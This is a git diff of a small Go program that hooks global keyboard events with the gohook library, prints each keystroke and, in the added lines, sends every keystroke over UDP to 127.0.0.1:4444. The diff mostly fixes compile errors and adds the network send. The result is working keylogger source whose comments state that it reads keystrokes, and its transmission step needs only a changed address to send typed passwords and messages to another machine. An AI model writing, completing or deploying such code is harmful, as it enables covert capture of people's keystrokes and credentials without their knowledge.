@@ -1,11 +1,10 @@
-package server
+package main
 
 import (
 	"fmt"
 	"net"
 
 	hook "github.com/robotn/gohook"
-	hook "github.com/robotn/gohook "
 )
 
 func main() {
@@ -13,7 +12,7 @@ func main() {
 	evchan := hook.Start()
 	defer hook.End()
 	// setting address
-	addr, err := net.ResolveUDPAddr("udp", "4444")
+	addr, err := net.ResolveUDPAddr("udp", "127.0.0.1:4444")
 
 	if err != nil {
 		fmt.Println(err)
@@ -30,7 +29,6 @@ func main() {
 	}
 	// close connection at the end
 	defer conn.Close()
-
 	// reading the keystrokes
 
 	for k := range evchan {
@@ -39,15 +37,21 @@ func main() {
 
 			switch k.Keychar {
 			case 13:
-				keystroke := "Return(Enter)"
+				keystroke = "Return(Enter)"
 			case 32:
-				keystroke := "Space"
+				keystroke = "Space"
 			case 27:
-				keystroke := "Escape"
+				keystroke = "Escape"
 			}
 
 			fmt.Printf("Pressing: %s\n", keystroke)
+			data := []byte(keystroke)
 
+			_, err := conn.WriteToUDP(data, addr)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
 		}
 	}
 }
